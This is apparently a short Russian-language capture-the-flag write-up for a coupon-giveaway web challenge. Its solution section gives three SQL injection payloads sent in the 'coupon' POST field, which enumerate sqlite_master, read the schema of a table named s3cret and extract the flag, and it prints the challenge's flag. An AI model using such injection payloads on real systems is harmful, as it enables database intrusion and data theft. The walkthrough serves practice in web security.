## Описание

Продажи падали. Босс поручил бухгалтеру сделать странницу с розыгрышем подарочных купонов. Но внезапно сайт был взломан.

## Решение

Посылаем POST запрос через постман и узнаем полный список таблиц в БД:
```
coupon = 4 UNION SELECT name FROM sqlite_master WHERE type='table'
```
Среди всего списка самая интересная таблица – это s3cret, изучаем ее структуру с помощью запроса:
```
coupon = 4 UNION SELECT sql FROM sqlite_master WHERE type='table' and name='s3cret'
```
Получаем флаг:
```
coupon = 4 UNION SELECT fl4g FROM s3cret
```
DUCKERZ{sql_inj3c7ion_hero}
